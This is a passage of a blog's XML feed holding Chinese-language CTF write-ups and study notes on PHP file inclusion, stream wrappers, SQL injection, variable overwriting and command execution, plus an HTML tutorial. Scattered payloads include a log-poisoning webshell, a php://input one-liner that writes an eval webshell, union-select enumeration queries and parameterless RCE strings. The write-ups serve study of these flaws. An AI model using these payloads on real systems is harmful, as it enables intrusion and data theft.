highlight_file(__FILE__);<br>}<br>这道题跟上一道题不一样的是这个data也不能用了，我是又想说大小写一下PHP：//filter或者DATA://text这样的但是都没有成功，就是用哪个PHP：//input这个成功了<br><li>第三题<br>if(isset($_GET['file'])){<br>    $file = $_GET['file'];<br>    $file = str_replace("php", "???", $file);<br>    $file = str_replace("data", "???", $file);<br>    $file = str_replace(":", "???", $file);<br>    include($file);<br>}else{<br>    highlight_file(__FILE__);<br>}<br>这个不好做的一点是说它连：都不能用了，看了view hint是给了个提示是文件包含getshell漏洞，具体漏洞是怎样的我有在一个博客中写道，给了一个包含日志文件 进行getshell 日志文件路径： ?file=/var/log/nginx/access.log<br>因为不同的系统的重用的文件路径是不一样的，所以就在bp的user—agent中加了个木马，连上蚁剑得到flag。</li>第三个类型sql注入题目打开后出来的界面是就是一个很简单的填写用户名和密码，随便输入的是没有报错只是清空了界面，emmm这里了解下万能密码，我这里用的是'or 1=1 #,也就是lucky'or 1=1 #,因为那个#号是注释符，所以语句后面是被注释掉的，也就是说密码是啥无所为了<br>然后就可以看到虽然那个界面又被清空了，但是，出现了欢迎你，ctfshow。<br>然后就是判断字段，爆库，爆表，爆字段<br>在bp那输入union select 1,2,3知道输入到三的时候出现了ctfshow欢迎你那出现了欢迎你，说明有三个字段<br>然后爆库，union select 1，database（），3找到库名<BR>爆表union select 1,group_concat(table name),3 from information_schema.tables where table_schema="web 2"(库名)<br>爆字段 union select 1,group_concat(columu_name),3 from information_schema.columans where table_name="flag"<br>爆值union select 1,flag,3 from flag得到flag<h1><font color="DarkSeaGreen"><em>ssrf漏洞</em></font></h1>ssrf，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，ssrf攻击的目标是外网无法访问的内部系统。<br><ul><li>可以对外网，服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息.</li><li>攻击运行在内网、本地的应用程序（比如溢出）<li>对内网web应用进行指纹识别，通过访问默认文件实现。<li>攻击内外网的web应用，主要是使用get参数就可以实现攻击。<li>利用file协议读取本地文件等。]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php函数</title>
      <link href="/2020/12/02/php%E5%87%BD%E6%95%B0/"/>
      <url>/2020/12/02/php%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>无</p><span id="more"></span><h1><li>str_replace</h1>  替换字符串的一些字符(区分大小写)<br>  如果搜索的字符串是一个数组，那么它将返回一个数组。对数组的每一个元素进行查找和替换。如果同时对某个数组进行查找和替换，并且需要执行的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。如果是对一个数组进行查找，但是支队一个字符串进行替换，那么替换的字符串将对所有查找到的值起作用。<BR>  <em>语法</em>  str_replace(find,replace,string,count)  <table border="1">  <tr>    <th>参数</th>    <th>描述</th>  </tr>  <td>find</td>  <td>必需。规定要查找的值</td>  </tr>   <tr>  <td>replace</td>  <td>必需，规定替换find的值</td>  </tr>  <tr>  <td>string</td>  <td>必需规定被搜索的字符串</td>  </tr>  <tr>  <td>count</td>  <td>可选，一个变量，对替换数进行计数</td>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>伪协议</title>
      <link href="/2020/12/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/12/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>伪协议的学习</p><span id="more"></span><p><font color="DarkSeaGreen">伪协议的学习</font></p><p>php伪协议常用于文件包含漏洞中，在php中能进行文件包含的函数有，include（），require（），require_once（），include_once（），highlight_file（），show_source（），file_get_contents（），file（）等</p><h1>include函数</h1><br>    可以放在php脚本的任意部位，一般放在流程流程控制的处理部分中。当php执行到include指定引入的文件时，才将他包含并尝试执行。当第二次遇到相同的函数时，php还是会重新解释，同时在引入文件包含用户自定义函数使，php在解释的过程中会发生函数重新定义的问题。成功返回1，失败返回false<h1>require函数</h1>    require函数一般放在php脚本的最前面，php执行前就会读入require指定引入的文件，包含并尝试执行引入的脚本文件。当它在统一的网页中解释后，第二次便不会解释。但同时因为它不会重复解释引入文件，所以当php中使用循环或条件语句来引入文件时，需要用到include。成功载入1，失败无返回值。<h1>include_once和require_once函数</h1>    分别与include与require的作用相同，不同的是他们在执行到时会先检查目标内容是不是在之前已经导入过，如果是那便不会再次重复引用其同样的内容。<h1>highlight_file函数</h1>    对文件进行语法的高亮显示<br>    语法：highlight_file(filename，return)——filename：必需。要进行高亮处理的php文件路径。return：可选。如果设置true，则本函数返回高亮处理的代码。<br>    该函数通过使用php语法高亮程序中定义的颜色，输出或返回包含在filename中代码的语法高亮版本。如果return参数被设置为true，那么该函数会返回被高亮处理的代码，而不是输出他们，否则，若成功，则返回true，失败则返回false。许多服务器被配置为对带有phps后缀的文件进行自动高亮处理。<h1>show_source函数</h1>    是highlight_file函数的别名。<h1>file_get_contents函数</h1>    把整个文件读到一个字符串中。是首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。<br>    语法：file_get_content(path,include_path,context,start,max_length)<br><table border="1">   <tr>       <th>参数</th>       <th>描述</th>   </tr>   <tr>       <td>path</td>       <td>必须。规定要读的文件</td>   </tr>   <tr>       <td>include_path</td>       <td>可选，如果也想在include_path中设置文件的话，可以将参数设为1</td>   </tr>  <tr>       <td>context</td>       <td>可选，规定文件句柄的环境。<br>       context是一套可以选择流的行为的选项。若使用null，则忽略。</td>  </tr>  <tr>      <td>start</td>      <td>可选。规定在文件中可以读取的位置。</td>  </tr>   <tr>max_length</tr>  <tr>可选。规定读取的字节数。</tr></table><h1>file函数</h1>     把整个文件读入一个数组中。数组中每个单元都是文件中相应的一行，包括换行符在内。如果失败，返回false。<br>     语法:file（path，include_path，context）<br>     每个参数的含义同上<h1>fopen函数</h1><h1>readfile函数</h1><p><font color="DarkSeaGreen">伪协议总结</font></p><h1>file：//协议</h1><ul>     <li>条件：allow_url_fopen  on/off <br>          allow_url_include on/off </li> <br> <li>作用：用于访问本地文件，在ctf通常用来读取本地文件且不受限制。</li><li>说明：file：//文件系统是php使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或windows盘符开头的路径）提供的路径将基于当前的文件目录。<br><li>示例<br>    file：//[文件的绝对路径和文件名]<br>    ？file=file：//E：\phpstudy\www\phpinfo.txt<br>    [文件的相对路径和文件名]<br>    ？file=flag<br>    [http：//网络路径和文件名]<br>    ?file=http://127.0.0.1/flag</li></ul><h1>php://协议</h1><ul>   <li>条件：    allow_url_fopen：on/off    allow_url_include:   </li>   <li>作用：    php：//访问各个输入/输出流（i/o streams），在ctf中经常使用的是php：//filter和php：//input，php：//filter用于读取源码，php：//input用于执行php代码。</li>  <li><em>php://filter参数详解</em>    该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。</li><table border="1"><tr>    <th>参数</th>    <th>描述</th></tr><tr>    <td>resource=<要过滤的数据流></td>    <td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr>     <td>read=<读链的过滤器></td>     <td>可选项。可以设定一个或多个过滤器的名称，以管道符（**）分隔。</td></tr><tr>    <td>write=<写链的过滤器></td>    <td>可选项。可以设定一个或多个过滤器的名称，以管道符（\)分隔。</tr><tr>    <td><;两个链的过滤器></td>    <td>任何没有以read=和write=作前缀的筛选器列表会视情况应用于读或写链。</td></tr></table><li> 主要的过滤器</li><table border="1"><tr>    <th>字符串过滤器</th>    <th>作用</th></tr><tr>    <td>string.rot13</td>    <td>等同于str_rot13（），rot13变换</td><tr>    <td>string.toupper</td>    <td>等同于strtoupper（），转大写字母</td></tr><tr>    <td>string.tolower</td>    <td>等同于strtolower，转小写字母</td></tr><tr>    <td>string.strip_tags</td>    <td>等同于strip_tags（），去掉html，php语言标签。</td></tr></table><table border="1"><tr>    <th>转换过滤器</th>    <th>作用</th></tr><tr>    <td>convert.base64-encode/convert.base64-decode</td>    <td>base64的编码解码</td></tr><tr>    <td>convert.quoted-printable-encode/convert.quoted-printable-decode quoted-printable</td>    <td>字符串与8-bit字符串的编码解码。</td></tr></table><table border="1"><tr>    <th>压缩过滤器</th>    <th>作用</th></tr><tr>    <td>zlib.deflate zlib.inflate</td>    <td>在本地系统中创建gzip兼容文件的方法，但不产生命令行工具如gzip的头和尾信息。只是压缩与解压数据流中的有效载荷部分</td></tr><tr>    <td>bzip2.compress bzip.decompress</td>    <td>同上，在本地文件系统中创建bz2兼容文件的方法。</td></tr></table><table border="1"><tr>    <th>加密过滤器</th>    <th>作用</th></tr><tr>    <td>mcrypt*</td>    <td>libmcrypt的对称加密算法</td></tr><tr>    <td>mdecryot*</td>    <td>libmcrypt的对称解密算法</td></tr></table><li>php：//filter/resource=[文件名]读取文件源码<br>    file=php：//filter/resource=flag</li><li>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）<br>   file=php：//filter/read=convert.base64.encode/resource=flag</li><li>php://input+[POST DATA]执行代码<br>   ？file=php：//input    [POST DATA部分]&#60;?php phpinfo();?&#62;<br>    post data在harkbar中输入</li><li>若有权限可写入一句话木马<br>    ?file=php://input<br>    [POST DATA]&#60;?php fputs(fopen('yijuhua.php''w'),'&#60;?php @eval($_GET[cmd]);?&#62;');?&#62;</li><h1>zip：//&bzip：//&zlib：//</h1>   <li>条件</li><br>      不受限制   <li>作用<br>     zip：//&bzip：//&zlib：//均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：ipg png gif xxx等<br>     zip://[压缩文件绝对路径]#(%23)[压缩文件内的子文件名]<br>     在文件上传场景下，压缩phpinfo.txt为phpinfo.zip，压缩包重命名为phpinfo.jpg并上传     ？file=zip://D:\phpstudy\WWW\phpinfo.jpg%23phpinfo.txt<br></li><em>类似</em>     压缩phpinfo.txt为phpinfo.bz2并上传（同样支持任意后缀名）     ？file=compress.bzip://D:\phpstudy\WWW\phpinfo.bz2<br>     压缩phpinfo.txt为phpinfo.gz并上传（同样支持任意后缀名）     ？file=compress.zlib：//D：\phpstude\WWW\phpinfp.gz<br><h1>phar://协议</h1>     同zip协议<br>     phar：//[压缩文件绝对路径]/[压缩文件内的子文件名]<br>     ？file=phar://D:\phpstudy\WWW\phpinfo.zip\phpinfo.txt<br><h1>data：//</h1>  <li>条件     allow_url_fopen：on     allow_url_include：on  <li>示例     data：//text/plain，<br>     ?file=data://text/plain,&#60;?php%20phpinfo();?&#62;<br>     data://text/plain;base64,<br>     ?file=data://text/plain;base64,PD9waHAlMjBwaHBpbmZvKCk7Pz4=<h1>http：//&http：//</h1>  <li>条件<br>  allow_url_fopen:on  allow_url_include:on  <li>作用<br>  常规url形式，允许通过http1.0的GET方法，以只读访问文件或资源。用于远程包含。  <li>？file=http：//127.0.0.1/phpinfo.txt]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖二</title>
      <link href="/2020/11/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%BA%8C/"/>
      <url>/2020/11/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>变量覆盖2</p><span id="more"></span><h1><font color="SlateGray">还是要先了解一下什么是变量覆盖</font></h1>          用我们自定义的参数值来替换程序原有的变量值<h2><font color="RosyBrown">好家伙，刚拿到题的时候还真是一脸懵，看不懂代码，QAQ。百度了一下，参考变量覆盖其他题目，大概明白了是什么意思</font></h2><html><head> <meta charset="utf-8"> <title>变量覆盖</title> </head><body><div style="opacity:0.2;position:absolute;left:6px;width:900px;height:1000px;background-color:#40B3DF"></div><p>&#60;?php<br><br>highlight_file(<strong>FILE</strong>);<br><br>include “flag.php”;//有个flag.php的文件，里面有flag<br></p><p>$_403 = “拒绝访问”;<br><br>$_200 = “欢迎~~~”;<br></p><p>if ($_SERVER[“REQUEST_METHOD”] != “POST”)<br><br>    die(“sssssssspost…”);<br></p><p>if ( !isset($_POST[“flag”]) )<br><br>    die($_403);<br></p><p>foreach ($_GET as $key =&gt; $value)<br><br>    $$key = $$value;<br></p><p>foreach ($_POST as $key =&gt; $value)<br><br>    $$key = $value;//<font color="IndianRed">看到这里，flag的值被覆盖，如果$key等于flag，则$$key就等于$flag，如果$$value=$cky,而cky是个有变量的值，那么就可以让$flag=$cky，得到flag</font><br></p><p>if ( $_POST[“flag”] !== $flag )<br><br>    die($_403);//<font color="IndianRed">看到这里，数组循环那么这个判断一定是相等的，所以是无法进入_403</font><br></p><p>echo “This is your flag : “. $flag . “\n”;<br><br>die($_200);//<font color="IndianRed">所以我们可以先把flag的值赋给_200然后通过，die_200把flag的值输入出来</font><br></p><p>?&#62;</p></div></body></html><h1><font color="SlateGray">开始解题</font></h1><p>首先把flag的值赋给_200，就是用get的方式，构造？_200=flag<br><br>然后用post的方式，赋给flag的值，flag=cky<br><br><img src="1.png" alt="1"><br><br><img src="2.png" alt="2"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>html学习报告</title>
      <link href="/2020/11/27/html%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2020/11/27/html%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>无</p><span id="more"></span><h1><font color="LightBlue">html的标题</font></h1>      html的标题是通过&#60;h1&#62;-&#60;h6&#62;标签来定义的，&#60;h1&#62;定义最大的标题。&#60;h6&#62;定义最小的标题<h1><font color="LightBlue">html的段落</font></h1>       <p>这是第一段</p>       <p>这是第二段</p>实际上它是长这样的,是这样的       &#60;p&#62;这是第一段&#60;/&#62;        <br>       &#60;p&#62;这是第二段&#60;/&#62;<h1><font color="LightBlue"><b>html</b><em>文本</em><i>格式化</i></font></h1>      &#60;b&#62;        定义粗体文本<br>      &#60;em&#62;        定义着重文字<br>      &#60;i&#62;        定义斜体字<br>      &#60;small&#62;   定义小号字<br>      &#60;strong&#62;  定义加重语气<br>      &#60;sub&#62;     定义下标字<br>      &#60;sup&#62;      定义上标字<br>      &#60;ins&#62;        定义插入字<br>      &#60;del&#62;        定义删除字<br><h1><font color="LightBlue ">html链接</font></h1><h2>语法是这样的</h2>     &#60;a href="url"&#62;链接文本&#60;/a&#62;<br>    <a herf="ckylsy.github.io"target="_blank">cky的博客</a><h2>target属性</h2>      blank 所指浏览器总在一个新打开的，未命名的窗口中载入目标文档。<br>      &#60;a herf="ckylsy.github.io"target="_blank"&#62;博客&#60;/a&#62;<br>      self 在相同的框架中打开被链接的文档<br>      parent 在父框架集中打开被链接的文档<br>      top 在整个窗口中打开被链接的文档<br><h2>id属性</h2>      id属性可用于创建在一个html的书签标志，不以任何特殊的方式显示<h1><font color="LightBlue">html的头部</font></h1>先介绍head头部可插入的元素标签      &#60；title&#62；  定义了浏览器工具栏的标题，当网页添加到收藏夹时，显示在收藏夹中的标题，显示在搜索引擎结果页面的标题<br>      &#60;base&#62;    标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接<br>      &#60;link&#62;   标签定义了文档与外部资源之间的关系,标签通常用于链接到样式表<br>      &#60;style&#62; 标签定义了HTML文档的样式文件引用地址.在&#60;style&#62; 元素中你也可以直接添加样式来渲染 HTML 文档.<br>      &#60;meta&#62;  标签描述了一些基本的元数据。&#60;meta&#62; 标签提供了元数据.元数据也不显示在页面上，但会被浏览器解析。&#60;meta&#62;元素通常用于指定网页的描述,关键词,文件的最后修改时间,作者,和其他元数据。元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。<br>     &#60;script&#62;标签用于加载脚本文件,如:JavaScript<br><h1><fong color="LightBlue">CSS</font></h1><br><html><head> <meta charset="utf-8"> <title>html学习报告</title> </head><body><div style="opacity:0.4;position:absolute;left:60px;width:369px;height:150px;background-color:#40B3DF"></div><div style="font-family:verdana;opacity:0.5;padding:20px;border-radius:10px;border:10px solid #CD853F;"><div style="opacity:0.3;position:absolute;left:120px;width:100px;height:200px;background-color:#8AC007"></div><h3>Look! c  k  y  </h3><div style="letter-spacing:12px;">cky</div><div style="color:#40B3DF;">CKY<span style="background-color:#B4009E;color:#ffffff;">cky</span></div><div style="color:#000000;">cky</div></div></body></html><p>ahhh这是从网上帮过来的一段代码，看着挺好看的<br><br>css是为了更好的渲染HTML元素而引入的<br></p><h2>内联样式</h2>当特殊的样式需要应用到个别元素时，就可以使用内联样式。 使用内联样式的方法是在相关的标签中使用样式属性。样式属性可以包含任何 CSS 属性。<br><font color="Gray">背景颜色</font><br>    &#60;body style="background-color:yellow;"&#62;<br>    &#60;h2 style="background-color:red;"&#62;这是一个标题&#60;/h2&#62;<br>    &#60;p style="background-color:green;"&#62;这是一个段落。&#60;/p&#62;<br>    &#60;/body&#62;<br><font color="Gray">字体, 字体颜色 ，字体大小</font><br>     有font-family（字体），color（颜色），和font-size（字体大小）属性来定义字体的样式<br>    &#60;h1&#62; style="font-family:verdana;"&#62;一个标题&#60;/h1&#62;<br>    &#60;p&#62; style="font-family:arial;color:red;font-size:20px;"&#60;一个段落。&#60;/p&#62;<br><font color="Gray">外联样式</font><br>    当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。使用外部样式表，你就可以通过更改一个文件来改变整个站点的外观<br>&#60;head&#62;<br>&#60;link rel="stylesheet" type="text/css" href="mystyle.css"&#62;<br>&#60;/head&#62;<br><h1><font color="LightBlue">html图像</font></h1><font color="Gray">图像标签（&#60;img&#62;）和源属性（Src)</font><br>定于图像的语法是    $#60;img src="url" alt="some_text"$#62;<br>    URL 指存储图像的位置。alt 属性用来为图像定义一串预备的可替换的文本。<br><font color="Gray">图像的高度与宽度</font><br>    &#60;img src="名字.jpg" alt="文本" width="宽度" height="高"&#62;<h1><font color="LightBlue">表格</font></h1>&#60;table border="1"&#62;<br>//表格由 &#60;table&#62;标签来定义。    &#60;tr&#62;<br>//由tr来定义每行别分为的单元格        &#60;th>Header 1&#60;/th&#62;<br>//th来定于表格表头        &#60;th>Header 2&#60;/th&#62;<br>    &#60;/tr&#62;<br>    &#60;tr&#62;<br>        &#60;td>row 1, cell 1&#60;/td&#62;<br>//由td来定义每行        &#60;td>row 1, cell 2&#60;/td&#62;<br>    &#60;/tr&#62;<br>    &#60;tr&#62;<br>        &#60;td&#62;row 2, cell 1&#60;/td&#62;<br>        &#60;td&#62;row 2, cell 2&#60;/td&#62;<br>     &#60;/tr&#62;<br>    &#60;/table&#62;<br><h1><font color="LightBlue">列表</font></h1>分为有序列表和无序列表<br>无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记<br>     &#60;ul&#62;//是由ul定义<br>     &#60;li&#62;cky&#60;/li&#62;<br>     &#60;li&#62;cky&#60;/li&#62;<br>     &#60;/ul&#62;<br>      <ul>     <li>cky</li>     <li>cky</li>     </ul> 有序列表也是一列项目，列表项目使用数字进行标记。&#60;ol&#62;<br>&#60;li&#62;cky&#60;/li&#62;<br>&#60;li&#62;cky&#60;/li&#62;<br>&#60;/ol&#62;//有序列表始于&#60;ol&#62;标签。每个列表项始于&#60;li&#62;标签。 <br><ol><li>cky</li><li>cky</li></ol> <h1><font color="LightBlue">区块</font></h1><p>&#60;div&#62; 元素是块级元素，它可用于组合其他 HTML 元素的容器。<br>&#60;div&#62;元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。如果与 CSS 一同使用，&#60;div&#62; 元素可用于对大的内容块设置样式属性。<br>&#60;div&#62; 元素的另一个常见的用途是文档布局。它取代了使用表格定义布局的老式方法。使用 &#60;table&#62; 元素进行文档布局不是表格的正确用法。&#60;table&amp;&#62; 元素的作用是显示表格化的数据.<br><br>&#60;span&#62; 元素是内联元素，可用作文本的容器&#60;span&#62;元素也没有特定的含义。当与 CSS 一同使用&#60;span&#62; 元素可用于为部分文本设置样式属性。</p><h1><font color="LightBlue">表单</font></h1>文本域通过&#60;input type="text"&#62; <input type="text">标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。<br>密码字段通过标签&#60;input type="password"&#62; <input type="password">来定义<br>&#60;input type="radio"&#62; <input type="radio">标签定义了表单单选框选项<br>&#60;<brinput type="checkbox"&#62; <input type="checkbox">定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。<br>&#60;input type="submit"&#62;<input type="submit"> 定义了提交按钮.当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。<br><h1><font color="LightBlue">框架</font></h1>iframe语法:&#60;iframe src="URL"&#62;&#60;/iframe&#62;<br>该URL指向不同的网页<h1><font color="LightBlue">脚本</font></h1>&#60;script&#62; 标签用于定义客户端脚本，比如 JavaScript。&#60;script&#62; 元素既可包含脚本语句，也可通过 src 属性指向外部脚本文件。&#60;noscript&#62; 标签提供无法使用脚本时的替代内容，比方在浏览器禁用脚本时，或浏览器不支持客户端脚本时。&#60;noscript&#62;元素可包含普通 HTML 页面的 body 元素中能够找到的所有元素。只有在浏览器不支持脚本或者禁用脚本时，才会显示 &#60;noscript&#62; 元素中的内容<h1><font color="CadetBlue ">大体也就这么多了吧</font></h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>rce2</title>
      <link href="/2020/11/26/rce2/"/>
      <url>/2020/11/26/rce2/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>basic rce 2</p><pre><code>直接构造？Rem=（&quot;ca\t f\lag&quot;）或者Rem=（&quot;\x63\x61\x74\x20\x66\x6c\x61\x67&quot;）就可以出来</code></pre><p><img src="5.png" alt="5"><br>但是在网上看到了一个比较厉害的做法<br></p><pre><code>?Rem=include $_GET[&quot;cky&quot;] ?&gt;&amp;cky=php://filter/read=convert.base64-encode/resource=flag&lt;br&gt;</code></pre><p>构造文件包含， ?Rem=include $_GET[“cky”] ?&gt;后面的？&gt;是要封闭，按我的理解是可能不对，就是不会在过滤了，因为如果要伪协议读取里面是要有flag，$_GET[“cky”]这是传入一个参数，就是上面说的eval=<?php?>，后面在传入值。<br></p><p><img src="1.png" alt="3"><br>然后base64<br>这道题我刚开始还有一点的疑问是是构造？Rem还是？Ram，后来尝试后只有Rem可行，就想为什么，上网查发现get传入的参数只有rem，所以要用这个。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖</title>
      <link href="/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>extract变量覆盖</p><span id="more"></span><p><img src="1.png" alt="1"><br>先了解下题目中出现的几个函数<br>extract（）</p><pre><code>1.从数组中将变量导入到当前的符号表2.该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量</code></pre><p>trim（）</p><pre><code>去除字符串首尾的空白字符（或其它字符）</code></pre><p>file_get_contents()</p><pre><code>把整个文件读入到一个字符串中语法：file_get_contents(path,include_path,context,start,max_length)path,必需，规定要读文件的路径</code></pre><p>flag并不是文件地路径，所以content的值为空，所以让liwu的值与content的值都为空即构造？liwu=&amp;flag=或者构造？liwu=<br><img src="2.png" alt="2"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见命令汇总</title>
      <link href="/2020/11/25/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB/"/>
      <url>/2020/11/25/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>遇到后随时补充</p><span id="more"></span><p> 1.cat<br><br>　　由第一行开始显示内容，并将所有内容输出。当文件过大时，使用cat查看不方便。<br><br>　　语法：cat -n filename.txt （-n：显示时，连行号一起输出）v<br>2.tac<br><br>　　从最后一行倒序显示内容，并将所有内容输出。<br><br>　　语法：tac filename.txt<br><br>3.more<br><br>　　根据窗口大小，一页一页的显示文件内容，退出查看页面，可按“q”键。<br>　　另外，more可以配合管道符“|”（pipe）使用，例如：ls -al | more<br>　　语法：more filename.txt<br><br>4.less<br><br>　　和more类似，但其优点可以使用【pageup】和【pagedown】键前后翻页。<br><br>　　语法：less filename.txt<br><br>　　less还有一个功能，可以在文件中进行搜索字符串。<br>5.head<br><br>　　只显示文件的前几行。<br><br>　　语法：head filename.txt 显示文件的前10行<br><br>　　head -n 3 filename.txt 显示前3行<br><br>　　head -3 filename.txt 显示前3行<br><br>6.tail<br><br>　　只显示文件的后几行<br>。<br>　　语法：同head<br><br>7.nl<br><br>　　nl的功能和cat -n一样，从第一行开始输出全部内容，并且显示行号。<br><br>　　语法：nl filename.txt<br><br>8.tailf<br><br>　　类似于tail -f filename 监视filename文件的尾部内容（默认10行，相当于增加参数 -n 10），刷新显示在屏幕上。<br><br>　　tail -f 和 tailf 的区别：<br>   tailf 总是从文件开头一点一点的读， 而tail -f 则是从文件尾部开始读；<br><br>   tailf check文件增长时，使用的是文件名， 用stat系统调用；而tail -f 则使用的是打开的文件描述符；<br><br>   注：tailf 也可以做到类似跟踪文件名的效果，但是tail总是使用fstat系统调用，而不是stat系统调用。结果就是：默认情况下，当tail的文件被偷偷删除时，tail是不知道的，而tailf是知道的。<br>9.sort<br><br>  sort可针对文本文件的内容，以行为单位来排序。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>rce</title>
      <link href="/2020/11/25/rce/"/>
      <url>/2020/11/25/rce/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>basic rce</p><span id="more"></span><p>首先拿到题，就直接想到是不是一句话木马，然后连蚁剑，连不上，御剑扫描目录，补全index.php,还是连不上…</p><p>最下面有个简单的方法没想到当时<br></p><p>然后就在网上搜关于rce的资料，看见一个关于无参数读文件和RCE总结的介绍跟题目好像，我跟着那个操作，得出了flag。<br><img src="1.png" alt="1"><br><img src="2.png" alt="2"><br>这里把分享下通过这道题所学到的知识<br>先说什么是无参数？<br>就是只能使用函数，不能带有参数，且函数能接受其括号所带函数的返回值<br>。<br>这个题目就短短的几行代码，也看不出什么，所以就想着去看看这个页面有没有什么隐藏的目录。<br>法一。我们可以用print_r(scandir(‘.’));来查看所有的文件名和目录。<br>但是输入后没有回响，因为是无参数嘛，所以想办法去构造这个’.’<br>localeconv()<br>返回一组包含本地数字及货币格式信息的数组，而数组的第一项就是’.’，但要我们怎么取到这个’.’呢？<br>current（）<br>返回数组单元默认取第一个值<br>所以构造payload<br>？a=print_r(scandir(current(localeconv())));<br><img src="1.png" alt="1"><br>成功查看到所有的目录<br>法二<br>我们可以使用print_r(scandir(“绝对路径”));<br>绝对路径：绝对路径，就是从盘符开始的路径，例如：“c:\windows\system32\mfc42.dll”<br>获得绝对路径的函数有getcwd()<br>所以我们也可以构造<br>？a=print_r(scandir(getcew()));<br>我们所有的目录都是数组的值，我们要得到每个文件对应的数组<br>从目录名单中我们可以看到，flag对应的数组是在倒数第二位，那么我们就要去使用函数去读取这个倒数第二位的数组<br>了解几个函数<br>show_source()对文件进行高亮显示，<br>next（）数组内部的指针向前移一位<br>array_reverse()以相反的元素顺序返回数组。<br>所以构造payload<br>?a=show_source(next(array_reverse(scandir(getcew))));<br>拿到flag<br><img src="2.png" alt="2"><br>ps<br>如果想得到倒数第一个文件，可以用函数end()<br>构造payload？a=show_source(end(scandir(getcew（）)));<br>如果不是倒数第一个或者第二个，可以尝试随机函数<br>array_rand()随机返回一个数组<br>array_filp()交换数组地键和值<br>show_source(array_rand(array_filp(scandir(getcew()))));</p><p>突然学到一个简单的方法</p><p>用？a=system（”ls”）;去看目录，发现有个f111a9.php，然后就可以用cat，tac，sort，去查看，cat无回响，其他两个可以。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>exec1,php</title>
      <link href="/2020/11/21/exec1-php/"/>
      <url>/2020/11/21/exec1-php/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>无哈哈哈哈哈哈</p><span id="more"></span><p>拿到这道题，打开是空白，本小白表示很懵逼，看了一眼大佬写的wp，说是命令执行漏洞，很奇怪，怎么看出来就是命令执行漏洞了，大佬都这么厉害？先去百度了一下什么是命令执行漏洞，大概了解了下，看到了php有个exec()函数，这不就是我们的题目嘛，原来是这看出的。根据题目的提示，先输入/exec1.php，啊，它终于不是空白了。<br>！<a href="1.png">1</a><br>根据提示Ping了一下，？ip=127.0.0.1（本地回环ip，他代表设备的本地虚拟接口，所以被默认看作是永远不会宕掉的接口）<br>！<a href="2.png">2</a><br>然后就执行下一个指令，拼接符好像都被过滤了，所以使用换行符%0A执行ls命令，发现有个exec1.php的文件，直接cat无回响，去查看文件的目录，这里有get了一个知识点。<br>/：代表着根目录，是树形结构的最上层<br>.：表示当前目录，也可以用./表示；<br>. .：表示上一级目录，也可以用. ./表示；<br>！<a href="3.png">3</a><br>用了三次才出来，这题目也是，害。<br>然后cat得flag<br>！<a href="4.png">4</a><br>做题不易啊</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>做题中遇到的漏洞积累</title>
      <link href="/2020/11/21/%E5%81%9A%E9%A2%98%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%A7%AF%E7%B4%AF/"/>
      <url>/2020/11/21/%E5%81%9A%E9%A2%98%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%A7%AF%E7%B4%AF/</url>
      
